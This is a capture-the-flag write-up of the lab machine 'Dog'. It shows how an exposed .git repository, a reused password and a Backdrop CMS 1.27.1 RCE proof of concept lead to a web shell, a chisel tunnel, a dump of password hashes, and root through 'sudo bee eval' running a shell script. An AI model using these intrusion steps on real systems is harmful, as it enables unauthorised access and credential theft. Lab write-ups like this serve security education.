# Dog

![dog.png](dog.png)

## Initial Enumeration

```bash
# Nmap 7.95 scan initiated Fri Mar 28 14:04:29 2025 as: nmap -sC -sV -Pn -oN scans/nmap.initial 10.10.11.58
Nmap scan report for 10.10.11.58
Host is up (0.089s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
|_http-title: Home | Dog
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar 28 14:04:40 2025 -- 1 IP address (1 host up) scanned in 11.06 seconds
```

## Git-dumper
The site is PHP backdrop on Apache and it has a `.git` folder exposed
```bash
git-dumper http://10.10.11.58 .
```

The version of backdrop is
```bash
grep BACKDROP_VERSION core/includes/bootstrap.inc
```
```
define('BACKDROP_VERSION', '1.27.1');
```

We find the creds to the mysql db, this may be useful later
```bash
$database = 'mysql://root:B******************@127.0.0.1/backdrop';
```

Running gitleaks, didn't find anyting really interesting
```bash
gitleaks detect . -r gileaks.json
```

Just the domain from the commiter's email address
```bash
jq .[].Email gileaks.json
```
```
"dog@dog.htb"
"dog@dog.htb"
"dog@dog.htb"
"dog@dog.htb"
"dog@dog.htb"
"dog@dog.htb"
```

Based on that we find tiffany, and confirm that this is a valid user from the login page of the webapp
```bash
grep -ri dog.htb ./*
```
```
./files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:        "tiffany@dog.htb"
```

Turns out the db password and tiffany  are valid creds to connect to the site
```bash
tiffany@dog.htb:B******************
```

## RCE in backdrop 1.27.1

Looking for exploits related to backdrop version '1.27.1' we find this

- [https://packetstorm.news/files/id/189764/](https://packetstorm.news/files/id/189764/)

And run it
```bash
php poc.php http://10.10.11.58
```
```
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://10.10.11.58/admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://10.10.11.58/modules/shell/shell.php
```

The ui already tells us that there's no php module for zip with may be a problem
![nozip.png](nozip.png)

It confirms that when we try to upload the zip from the exploit, but also tells us how to fix it.
![tar.png](tar.png)

So it's easy we can just bundle the exploit in tar for instance
```bash
tar cvf shell.tar shell
```

And that works, we just gotta go to the php web-shell and we have RCE
![rce.png](rce.png)

And we can of course call ourselves back to get a decent shell
![shell.png](shell.png)


## Using chisel to connect to the db

```bash
netstat -tulpne
```
```
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      114        36882      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      101        30942      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          33577      -
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      114        36881      -
tcp6       0      0 :::80                   :::*                    LISTEN      0          34392      -
tcp6       0      0 :::22                   :::*                    LISTEN      0          33675      -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           101        30941      -
```
 
Build chisel with statically linked C libs and deploy it
```bash
CGO_ENABLED=0 go build .
```
```bash
./chisel server -p 4040 --socks5 --reverse
```
```bash
./chisel client 10.10.16.20:4040 R:1080:socks
```

Connect to the database
```bash
proxychains \
  mysql \
    -u root \
    -h 127.0.0.1 \
    --password='B******************' \
    -D backdrop \
    --skip-ssl \
    -A
```


```bash
MySQL [backdrop]> select name,pass,mail from users;
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
+-------------------+---------------------------------------------------------+----------------------------+
| name              | pass                                                    | mail                       |
+-------------------+---------------------------------------------------------+----------------------------+
|                   |                                                         |                            |
| jPAdminB          | $S$E7dig1GTaGJnzgAXAtOoPuaTjJ05fo8fH9USc6vO87T./ffdEr/. | jPAdminB@dog.htb           |
| jobert            | $S$E/F9mVPgX4.dGDeDuKxPdXEONCzSvGpjxUeMALZ2IjBrve9Rcoz1 | jobert@dog.htb             |
| dogBackDropSystem | $S$EfD1gJoRtn8I5TlqPTuTfHRBFQWL3x6vC5D3Ew9iU4RECrNuPPdD | dogBackDroopSystem@dog.htb |
| john              | $S$EYniSfxXt8z3gJ7pfhP5iIncFfCKz8EIkjUD66n/OTdQBFklAji. | john@dog.htb               |
| morris            | $S$E8OFpwBUqy/xCmMXMqFp3vyz1dJBifxgwNRMKktogL7VVk7yuulS | morris@dog.htb             |
| axel              | $S$E/DHqfjBWPDLnkOP5auHhHDxF4U.sAJWiODjaumzxQYME6jeo9qV | axel@dog.htb               |
| rosa              | $S$EsV26QVPbF.s0UndNPeNCxYEP/0z2O.2eLUNdKW/xYhg2.lsEcDT | rosa@dog.htb               |
| tiffany           | $S$EEAGFzd8HSQ/IzwpqI79aJgRvqZnH4JSKLv2C83wUphw0nuoTY8v | tiffany@dog.htb            |
+-------------------+---------------------------------------------------------+----------------------------+
9 rows in set (0.068 sec)
```

According to the hashcat examples pages those are drupal7 hashes.
```bash
hashcat --help|grep -i drupal
```
```
   7900 | Drupal7                                                    | Forums, CMS, E-Commerce
```

Couldn't really crack anything though, maybe because they're salted? Or maybe because it's just a really hard hash to crack. I'm not sure.
```bash
hashcat -m 7900 hash.txt ~/.local/share/seclists/rockyou.txt
```

## Privesc with bee backdrop cli

```bash
grep 'sh$' /etc/passwd
```
```
root:x:0:0:root:/root:/bin/bash
jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
```

The whole database part was quite useless anyway since apparently, the same password works with johncusack
```bash
sshpass -p"B******************" ssh johncusack@dog.htb
```

johncusack can run bee, which is a non official cli tool for backdrop


- [https://backdropcms.org/project/bee](https://backdropcms.org/project/bee)
- [https://github.com/backdrop-contrib/bee](https://github.com/backdrop-contrib/bee)

```bash
sudo -l
```
```
[sudo] password for johncusack:
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

```bash
sudo bee cron
```
```
 ✔  Cron ran successfully.
```

I don't really know what's going on with that, looks like its counting the columns of the shell or something? is this my own rlwrap shell thing?
```bash
2025/03/28 16:58:10 CMD: UID=0     PID=2986   | sh -c if tput cols &>/dev/null; then  echo $(tput cols); else $(echo $COLUMNS); fi
```

There's also an eval feature in bee, that makes stings easy, calling myself back again with a decent shell as root
```bash
sudo bee eval "system('bash /dev/shm/shell.sh');"
```
